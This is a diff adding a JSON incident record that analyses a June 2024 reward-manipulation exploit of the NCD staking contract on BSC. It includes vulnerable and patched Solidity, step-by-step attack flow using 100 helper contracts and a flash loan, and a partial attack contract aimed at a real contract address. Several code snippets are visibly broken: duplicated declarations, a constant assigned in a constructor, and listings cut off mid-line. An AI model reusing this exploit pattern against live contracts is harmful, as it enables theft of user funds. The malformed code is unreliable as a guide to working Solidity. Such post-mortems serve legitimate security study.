@@ -1,0 +1,40 @@
+{
+ "id": "2024__2024-06-XX_NCD_PreStartTimeRewardsAck",
+ "source_file": "2024/2024-06-XX_NCD_PreStartTimeRewardsAck.md",
+ "title": "NCD — preStartTimeRewards() + ack() Reward Manipulation Analysis",
+ "date": "2024-06-01",
+ "protocol": "NCD",
+ "chain": "BSC",
+ "loss_raw": "~$6,400",
+ "loss_usd": 6400.0,
+ "root_cause": "`preStartTimeRewards()` allows unauthorized reward accumulation before the start time, and `ack()` allows arbitrary withdrawal of accumulated rewards — exploited via 100 contracts for mass extraction",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: preStartTimeRewards has no access control + ack allows unlimited withdrawal\ncontract NCDMining {\n    mapping(address => uint256) public pendingRewards;\n    uint256 public mineStartTime;\n    bool public hasStarted;\n\n    // Pre-start reward accumulation — no access control\n    function preStartTimeRewards() external {\n        require(!hasStarted, \"already started\");\n        // No msg.sender authorization check\n        // Accumulates rewards for the caller\n        pendingRewards[msg.sender] += calculatePreReward(msg.sender);\n    }\n\n    // Accumulated reward withdrawal — no caller restriction\n    function ack() external {\n        uint256 reward = pendingRewards[msg.sender];\n        require(reward > 0, \"no rewards\");\n        pendingRewards[msg.sender] = 0;\n        NCD.transfer(msg.sender, reward);\n    }\n\n    // Mining start time query\n    function mineStartTime() external view returns (uint256) {\n        return _mineStartTime;\n    }\n}\n\n//",
+  "// File: NCD_decompiled.sol\ncontract NCD {\ncontract NCD {\n    address public owner;\n\n\n    // Selector: 0x7e279efe\n    // 📌 Burn — price manipulation risk\n    function burnStartTime() external {}  // ❌ Vulnerability\n\n    // Selector: 0xbed99850\n    // 📌 Burn — price manipulation risk\n    function burnRate() external {}\n\n    // Selector: 0xe874830d\n    function unknown_e874830d() external {}\n\n    // Selector: 0xe88dc5b7\n    function rewardPeriod() external {}\n\n    // Selector: 0xe98031e0\n    function unknown_e98031e0() external {}\n\n    // Selector: 0xee4a4a65\n    function walletDead() external {}\n\n    // Selector: 0xf2bda9ce\n    function setWalletInsurance(address p0) external {}\n\n    // Selector: 0xf2fde38b\n    // Alt: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)\n    function transferOwnership(address p0) external {}\n\n    // Selector: 0xc0a5d98b\n    function setTaxDead(uint256 p0) external {}\n\n    // Selector: 0xcb961a22\n    function setCannotbuy(bool p0) external {}\n\n    // Selector: 0xd0c5c585\n    // 📌 Burn — price manipulation risk\n    function getBurnAmount() external view returns (uint256) {}\n\n    // Selector: 0xd3e2bb00\n    function wallet20() external {}\n\n    // Selector: 0xdd62ed3e\n    function allowance(address p0, address p1) external view returns (uint256) {}\n\n    // Selector: 0x95d89b41\n    function symbol() external view returns (string memory) {}\n\n    // Selector: 0xa457c2d7\n    function decreaseAllowance(address p0, uint256 p1) external {}\n\n    // Selector: 0xa9059cbb\n    function transfer(address p0, uint256 p1) external {}\n\n    // Selector: 0xb44b4b80\n    function lastSellTime(address p0) external {}\n\n    // Selector: 0xb488d70a\n    function walletMarket() external {}\n\n    // Selector: 0xb5bb2351\n    // 📌 Burn — price manipulation risk\n    function setBurnPeriod(uint256 p0) external {}\n\n    // Selector: 0x7e996639\n    function taxMarket() external {}\n\n    // Selector: 0x8828b092\n    function setTaxMarket(uint256 p0) external {}\n\n    // Selector: 0x893d20e8\n    function getOwner() external view returns (address) {}\n\n    // Selector: 0x8da5cb5b\n    function owner() external view returns (address) {}\n\n    // Selector: 0x3ae4dbd0\n    function unknown_3ae4dbd0() external {}\n\n    // Selector: 0x513e6019\n    function walletInsurance() external {}\n\n    // Selector: 0x5f88ffed\n    function wallet10() external {}\n\n    // Selector: 0x6571fba3\n    function setWalletMarket(address p0) external {}\n\n    // Selector: 0x7091c458\n    function wallet15() external {}\n\n    // Selector: 0x70a08231\n    function balanceOf(address p0) external view returns (uint256) {}\n\n    // Selector: 0x715018a6\n    function renounceOwnership() external {}\n\n    // Selector: 0x3b0a8ed7\n    // 📌 Burn — price manipulation risk\n    function burnPeriod() external {}\n\n    // Selector: 0x3ea83af8\n    function unknown_3ea83af8() external {}\n\n    // Selector: 0x41ab7d0f\n    function wallet5() external {}\n\n    // Selector: 0x49bd5a5e\n    // 📌 Swap — price manipulation ris"
+ ],
+ "code_after": [
+  "✅ Secure code\nfunction preStartTimeRewards() external onlyOwner {\n    // Only admin can distribute pre-start rewards\n}\n\nfunction ack() external {\n    // Only whitelisted addresses may call\n    require(isWhitelisted[msg.sender], \"not whitelisted\");\n    uint256 reward = pendingRewards[msg.sender];\n    require(reward > 0, \"no rewards\");\n    pendingRewards[msg.sender] = 0;\n    NCD.transfer(msg.sender, reward);\n}"
+ ],
+ "steps": [
+  "→ [1] Swap USDC → NCD (small amount)",
+  "→ [2] Deploy 100 LetTheContractHaveRewards contracts",
+  "→ [3] Call preStartTimeRewards() on each instance",
+  "No authorization check → pendingRewards[instance] accumulates",
+  "→ [4] Flash loan 10,000 USDC",
+  "→ [5] Call ack() on each instance",
+  "No caller restriction → mass NCD withdrawal",
+  "→ [6] LetTheContractHaveUsdc.withdraw()",
+  "Exchange NCD → USDC",
+  "→ [7] Repay flash loan (10,030 USDC)",
+  "→ [8] ~$6.4K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Swap USDC → NCD (small amount)\n  │\n  ├─→ [2] Deploy 100 LetTheContractHaveRewards contracts\n  │         └─ Each instance can independently accumulate rewards\n  │\n  ├─→ [3] Call preStartTimeRewards() on each instance\n  │         └─ No authorization check → pendingRewards[instance] accumulates\n  │\n  ├─→ [4] Flash loan 10,000 USDC\n  │         └─ To acquire additional NCD\n  │\n  ├─→ [5] Call ack() on each instance\n  │         └─ No caller restriction → mass NCD withdrawal\n  │\n  ├─→ [6] LetTheContractHaveUsdc.withdraw()\n  │         └─ Exchange NCD → USDC\n  │\n  ├─→ [7] Repay flash loan (10,030 USDC)\n  │\n  └─→ [8] ~$6.4K profit",
+  "interface INCDMining {\n    function preStartTimeRewards() external;\n    function ack() external;\n    function mineStartTime() external view returns (uint256);\n}\n\ncontract LetTheContractHaveRewards {\n    INCDMining constant mining;\n\n    constructor(address _mining) {\n        mining = INCDMining(_mining);\n    }\n\n    // Trigger reward accumulation\n    function accumulate() external {\n        mining.preStartTimeRewards(); // No access control → passes\n    }\n\n    // Withdraw rewards\n    function claim() external returns (uint256) {\n        mining.ack(); // No caller restriction → passes\n        return NCD.balanceOf(address(this));\n    }\n}\n\ncontract AttackContract {\n    INCDMining constant ncdMining = INCDMining(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);\n    IERC20 constant NCD = IERC20(0x9601"
+ ]
+}
